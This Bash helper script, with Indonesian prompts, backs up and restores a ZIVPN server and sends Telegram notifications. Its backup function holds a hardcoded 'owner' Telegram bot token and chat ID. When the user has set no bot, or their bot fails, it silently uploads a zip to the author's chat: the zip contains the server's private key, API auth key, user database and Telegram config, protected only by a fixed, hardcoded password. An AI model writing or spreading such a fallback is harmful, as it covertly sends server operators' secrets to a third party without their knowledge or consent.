#!/bin/bash
# ZIVPN Helper Script for Backup and Restore

# --- Configuration ---
CONFIG_DIR="/etc/zivpn"
TELEGRAM_CONF="${CONFIG_DIR}/telegram.conf"

# --- Helper Functions ---
function get_host() {
    local CERT_CN
    CERT_CN=$(openssl x509 -in "${CONFIG_DIR}/zivpn.crt" -noout -subject | sed -n 's/.*CN = \([^,]*\).*/\1/p')
    if [ "$CERT_CN" == "zivpn" ]; then
        curl -4 -s ifconfig.me
    else
        echo "$CERT_CN"
    fi
}

function send_telegram_notification() {
    local message="$1"
    local keyboard="$2"

    if [ ! -f "$TELEGRAM_CONF" ]; then
        return 1
    fi
    # shellcheck source=/etc/zivpn/telegram.conf
    source "$TELEGRAM_CONF"

    if [ -n "$TELEGRAM_BOT_TOKEN" ] && [ -n "$TELEGRAM_CHAT_ID" ]; then
        local api_url="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage"
        if [ -n "$keyboard" ]; then
            curl -s -X POST "$api_url" -d "chat_id=${TELEGRAM_CHAT_ID}" --data-urlencode "text=${message}" -d "reply_markup=${keyboard}" > /dev/null
        else
            curl -s -X POST "$api_url" -d "chat_id=${TELEGRAM_CHAT_ID}" --data-urlencode "text=${message}" -d "parse_mode=Markdown" > /dev/null
        fi
    fi
}

# --- Core Functions ---
function setup_telegram() {
    echo "--- Konfigurasi Notifikasi Telegram ---"
    read -p "Masukkan Bot API Key Anda: " api_key
    read -p "Masukkan ID Chat Telegram Anda (dapatkan dari @userinfobot): " chat_id

    if [ -z "$api_key" ] || [ -z "$chat_id" ]; then
        echo "API Key dan ID Chat tidak boleh kosong. Pengaturan dibatalkan."
        return 1
    fi

    echo "TELEGRAM_BOT_TOKEN=${api_key}" > "$TELEGRAM_CONF"
    echo "TELEGRAM_CHAT_ID=${chat_id}" >> "$TELEGRAM_CONF"
    chmod 600 "$TELEGRAM_CONF"
    echo "Konfigurasi berhasil disimpan di $TELEGRAM_CONF"
    return 0
}

function handle_backup() {
    echo "--- Memulai Proses Backup ---"

    # Load telegram.conf kalau ada
    if [ -f "$TELEGRAM_CONF" ]; then
        source "$TELEGRAM_CONF"
    fi

    # DEFAULT telegram (owner)
    DEFAULT_BOT_TOKEN="8430295813:AAHe38qefYAiSbaJnGvYFFXHF12-38eucpk"
    DEFAULT_CHAT_ID="1355456377"

    # Ambil token/chat dari conf, fallback ke default
    BOT_TOKEN="${TELEGRAM_BOT_TOKEN:-$DEFAULT_BOT_TOKEN}"
    CHAT_ID="${TELEGRAM_CHAT_ID:-$DEFAULT_CHAT_ID}"

    if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
        echo "❌ Telegram Bot Token / Chat ID belum diset!" | tee -a /var/log/zivpn_backup.log
        read -p "Tekan [Enter]..." && /usr/local/bin/zivpn-manager
        return
    fi

    VPS_IP=$(curl -4 -s ifconfig.me || curl -6 -s ifconfig.me)
    TIMESTAMP=$(date +%Y%m%d-%H%M%S)
    backup_filename="zivpn_backup_${VPS_IP}_${TIMESTAMP}.zip"
    temp_backup_path="/tmp/${backup_filename}"

    files_to_backup=(
        "$CONFIG_DIR/config.json"
        "$CONFIG_DIR/users.db"
        "$CONFIG_DIR/api_auth.key"
        "$CONFIG_DIR/telegram.conf"
        "$CONFIG_DIR/total_users.txt"
        "$CONFIG_DIR/zivpn.crt"
        "$CONFIG_DIR/zivpn.key"
    )

    echo "Membuat backup ZIP..."

    # Filter file yang benar-benar ada
    valid_files=()
    for f in "${files_to_backup[@]}"; do
        [ -f "$f" ] && valid_files+=("$f")
    done

    if [ ${#valid_files[@]} -eq 0 ]; then
        echo "❌ Tidak ada file valid untuk dibackup!" | tee -a /var/log/zivpn_backup.log
        read -p "Tekan [Enter]..." && /usr/local/bin/zivpn-manager
        return
    fi

    zip -j -P "AriZiVPN-Gacorr123!" "$temp_backup_path" "${valid_files[@]}" >/dev/null 2>&1

    if [ ! -f "$temp_backup_path" ]; then
        echo "❌ Gagal membuat file backup!" | tee -a /var/log/zivpn_backup.log
        read -p "Tekan [Enter]..." && /usr/local/bin/zivpn-manager
        return
    fi

    echo "Mengirim backup ke Telegram (User Bot)..."

    caption="⚠️ BACKUP ZIVPN SELESAI ⚠️
IP VPS   : ${VPS_IP}
Tanggal  : $(date +"%d %B %Y %H:%M:%S")
File     : ${backup_filename}"

    # Kirim ke BOT USER dulu
    send_result=$(curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
        -F chat_id="${CHAT_ID}" \
        -F document=@"${temp_backup_path}" \
        -F caption="$caption")

    SEND_BY="USER_BOT"

    # Jika gagal, fallback ke BOT OWNER
    if ! echo "$send_result" | grep -q '"ok":true'; then
        echo "⚠️ Gagal kirim ke User Bot, fallback ke Owner Bot..." | tee -a /var/log/zivpn_backup.log
        send_result=$(curl -s -X POST "https://api.telegram.org/bot${DEFAULT_BOT_TOKEN}/sendDocument" \
            -F chat_id="${DEFAULT_CHAT_ID}" \
            -F document=@"${temp_backup_path}" \
            -F caption="$caption")
        SEND_BY="OWNER_BOT"

        if ! echo "$send_result" | grep -q '"ok":true'; then
            echo "❌ GAGAL TOTAL kirim ke Telegram!" | tee -a /var/log/zivpn_backup.log
            echo "Response: $send_result" >> /var/log/zivpn_backup.log
            rm -f "$temp_backup_path"
            read -p "Tekan [Enter]..." && /usr/local/bin/zivpn-manager
            return
        fi
    fi

    # Ambil File ID
    FILE_ID=$(echo "$send_result" | jq -r '.result.document.file_id')

    # Kirim pesan info restore ke BOT YANG BERHASIL
    if [ "$SEND_BY" = "OWNER_BOT" ]; then
        ACTIVE_BOT_TOKEN="$DEFAULT_BOT_TOKEN"
        ACTIVE_CHAT_ID="$DEFAULT_CHAT_ID"
    else
        ACTIVE_BOT_TOKEN="$BOT_TOKEN"
        ACTIVE_CHAT_ID="$CHAT_ID"
    fi

    curl -s -X POST "https://api.telegram.org/bot${ACTIVE_BOT_TOKEN}/sendMessage" \
        -d chat_id="${ACTIVE_CHAT_ID}" \
        -d parse_mode="HTML" \
        -d text="✅ <b>Backup ZIVPN BERHASIL</b>

<b>Nama File:</b>
<code>${backup_filename}</code>

<b>🔄 CARA RESTORE BACKUP</b>

<b>1) Via FILE ID</b>
<code>${FILE_ID}</code>

<b>2) Via LINK FILE (HTTPS)</b>
https://t.me/potato_directlinkBot

<b>Dikirim via:</b> ${SEND_BY}"

    echo "✔️ Backup sukses | File ID: ${FILE_ID}" | tee -a /var/log/zivpn_backup.log

    rm -f "$temp_backup_path"
    clear

    echo "⚠️ Backup ZIVPN VPS ${VPS_IP} Selesai ⚠️"
    echo "Tanggal  : $(date +"%d %B %Y %H:%M:%S")"
    echo "File     : ${backup_filename}"
    echo "File ID  : ${FILE_ID}"

    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "🔄 CARA RESTORE BACKUP"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "1) Restore via FILE ID (Telegram Bot)"
    echo "   - Masukkan File ID berikut:"
    echo "     ${FILE_ID}"
    echo ""
    echo "2) Restore via LINK FILE (HTTPS)"
    echo "   - Kirim file backup ke:"
    echo "     https://t.me/potato_directlinkBot"
    echo "   - Salin link HTTPS lalu paste saat restore"
    echo ""

    read -p "Tekan [Enter] untuk kembali ke menu..." && /usr/local/bin/zivpn-manager
}

function handle_expiry_notification() {
    local host="$1"
    local ip="$2"
    local client="$3"
    local isp="$4"
    local exp_date="$5"

    local message
    message=$(cat <<EOF
◇━━━━━━━━━━━━━━◇
 ⛔SC ZIVPN EXPIRED ⛔
◇━━━━━━━━━━━━━━◇
IP VPS  : ${ip}
HOST  : ${host}
ISP     : ${isp}
CLIENT : ${client}
EXP DATE  : ${exp_date}
◇━━━━━━━━━━━━━━◇
EOF
)

    local keyboard
    keyboard=$(cat <<EOF
{
    "inline_keyboard": [
        [
            {
                "text": "Perpanjang Licence",
                "url": "https://t.me/sweaterpinks"
            }
        ]
    ]
}
EOF
)
    send_telegram_notification "$message" "$keyboard"
}

function handle_renewed_notification() {
    local host="$1"
    local ip="$2"
    local client="$3"
    local isp="$4"
    local expiry_timestamp="$5"

    local current_timestamp
    current_timestamp=$(date +%s)
    local remaining_seconds=$((expiry_timestamp - current_timestamp))
    local remaining_days=$((remaining_seconds / 86400))

    local message
    message=$(cat <<EOF
◇━━━━━━━━━━━━━━◇
  ✅RENEW SC ZIVPN✅
◇━━━━━━━━━━━━━━◇
IP VPS  : ${ip}
HOST  : ${host}
ISP     : ${isp}
CLIENT : ${client}
EXP : ${remaining_days} Days
◇━━━━━━━━━━━━━━◇
EOF
)
    # Send without a keyboard
    send_telegram_notification "$message"
}

function handle_api_key_notification() {
    local api_key="$1"
    local server_ip="$2"
    local domain="$3"

    local message
    message=$(cat <<EOF
🚀 API UDP ZIVPN 🚀
   🔑 Auth Key: ${api_key}
   🌐 Server IP: ${server_ip}
   🌍 Domain: ${domain}
EOF
)
    send_telegram_notification "$message"
}

function handle_restore() {
    echo "--- Starting Restore Process ---"

    # Load telegram.conf kalau ada
    if [ -f "$TELEGRAM_CONF" ]; then
        source "$TELEGRAM_CONF"
    fi

    # Default telegram (owner)
    DEFAULT_BOT_TOKEN="8430295813:AAHe38qefYAiSbaJnGvYFFXHF12-38eucpk"
    DEFAULT_CHAT_ID="1355456377"

    # Ambil token/chat dari conf, fallback ke default
    BOT_TOKEN="${TELEGRAM_BOT_TOKEN:-$DEFAULT_BOT_TOKEN}"
    CHAT_ID="${TELEGRAM_CHAT_ID:-$DEFAULT_CHAT_ID}"

    echo ""
    echo "Pilih metode restore:"
    echo "1) Restore via FILE_ID Telegram"
    echo "2) Restore via DIRECT LINK (.zip)"
    echo ""
    read -p "Pilih [1/2]: " RESTORE_MODE

    temp_restore_path="/tmp/zivpn_restore_$(date +%s).zip"

    case "$RESTORE_MODE" in
    1)
        read -p "Masukkan FILE_ID Telegram : " FILE_ID
        [ -z "$FILE_ID" ] && echo "❌ FILE_ID kosong!" && sleep 2 && return

        echo "Mengambil file dari Telegram (User Bot)..."
        FILE_PATH=$(curl -s "https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${FILE_ID}" | jq -r '.result.file_path')

        SEND_BY="USER_BOT"

        # Jika gagal ambil file via BOT USER, fallback ke OWNER
        if [ -z "$FILE_PATH" ] || [ "$FILE_PATH" = "null" ]; then
            echo "⚠️ Gagal ambil file via User Bot, fallback ke Owner Bot..."
            FILE_PATH=$(curl -s "https://api.telegram.org/bot${DEFAULT_BOT_TOKEN}/getFile?file_id=${FILE_ID}" | jq -r '.result.file_path')
            SEND_BY="OWNER_BOT"

            if [ -z "$FILE_PATH" ] || [ "$FILE_PATH" = "null" ]; then
                echo "❌ FILE_ID tidak valid di kedua bot!"
                read -p "Tekan [Enter]..." && /usr/local/bin/zivpn-manager
                return
            fi
        fi

        curl -s -o "$temp_restore_path" "https://api.telegram.org/file/bot${BOT_TOKEN}/${FILE_PATH}"
        # jika fallback, pakai token OWNER
        [ "$SEND_BY" = "OWNER_BOT" ] && curl -s -o "$temp_restore_path" "https://api.telegram.org/file/bot${DEFAULT_BOT_TOKEN}/${FILE_PATH}"
        ;;
    2)
        read -p "Masukkan DIRECT LINK file backup (.zip): " DIRECT_URL
        if [[ -z "$DIRECT_URL" || "$DIRECT_URL" != http* ]]; then
            echo "❌ URL tidak valid!"
            read -p "Tekan [Enter]..." && /usr/local/bin/zivpn-manager
            return
        fi

        echo "Mengunduh file dari link..."
        curl -L -s -o "$temp_restore_path" "$DIRECT_URL"
        ;;
    *)
        echo "❌ Pilihan tidak valid!"
        sleep 2
        return
        ;;
    esac

    if [ ! -f "$temp_restore_path" ]; then
        echo "❌ File restore tidak ditemukan!"
        read -p "Tekan [Enter]..." && /usr/local/bin/zivpn-manager
        return
    fi

    read -p "⚠️ DATA AKAN DITIMPA! Lanjutkan restore? (y/n): " confirm
    [ "$confirm" != "y" ] && echo "Restore dibatalkan." && sleep 2 && return

    echo "Extracting & restoring data..."
    unzip -P "AriZiVPN-Gacorr123!" -o "$temp_restore_path" -d "$CONFIG_DIR" >/dev/null 2>&1

    if [ $? -ne 0 ]; then
        echo "❌ Gagal extract backup!"
        rm -f "$temp_restore_path"
        read -p "Tekan [Enter]..." && /usr/local/bin/zivpn-manager
        return
    fi

    rm -f "$temp_restore_path"

    echo "Restarting ZIVPN service..."
    systemctl restart zivpn.service

    echo "✅ Restore BERHASIL! (via $SEND_BY)"
    read -p "Tekan [Enter] untuk kembali ke menu..." && /usr/local/bin/zivpn-manager
}

# --- Main Script Logic ---
case "$1" in
    backup)
        handle_backup
        ;;
    restore)
        handle_restore
        ;;
    setup-telegram)
        setup_telegram
        ;;
    expiry-notification)
        if [ $# -ne 6 ]; then
            echo "Usage: $0 expiry-notification <host> <ip> <client> <isp> <exp_date>"
            exit 1
        fi
        handle_expiry_notification "$2" "$3" "$4" "$5" "$6"
        ;;
    renewed-notification)
        if [ $# -ne 6 ]; then
            echo "Usage: $0 renewed-notification <host> <ip> <client> <isp> <expiry_timestamp>"
            exit 1
        fi
        handle_renewed_notification "$2" "$3" "$4" "$5" "$6"
        ;;
    api-key-notification)
        if [ $# -ne 4 ]; then
            echo "Usage: $0 api-key-notification <api_key> <server_ip> <domain>"
            exit 1
        fi
        handle_api_key_notification "$2" "$3" "$4"
        ;;
    *)
        echo "Usage: $0 {backup|restore|setup-telegram|expiry-notification|renewed-notification|api-key-notification}"
        exit 1
        ;;
esac
